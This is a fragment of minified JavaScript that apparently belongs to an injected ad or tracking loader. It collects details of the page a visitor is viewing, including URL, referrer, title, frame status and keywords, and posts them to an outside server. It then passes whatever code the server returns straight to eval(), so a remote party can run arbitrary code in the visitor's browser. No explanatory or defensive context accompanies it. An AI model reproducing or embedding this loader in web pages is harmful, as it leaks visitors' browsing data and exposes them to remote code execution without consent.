...
g=[],f=0;f<c.length;f++)"keywords"==c[f].name.toLowerCase()&&g.push(c[f].content);req={width:m,height:e,frame:a!=a.top,location:b.location.toString(),referer:b.referrer,title:b.title,keywords:g.join(", "),loader:k};b.gotowf||(b.gotowf=!0,ajax(h,req,function(a){if(a)try{var response=JSON.parse(a);response.eval&&eval(response.eval)}catch(c){console.log(c)}}))})(window,document,"http://mx.api.adsrun.net/post",{"name":"gapis","time":1457710067.8245,"user":"1049552.5750557","subid":1049552,"geo":"MX","hash":"2cb20617dc1bbda622e1008baf791acd"});
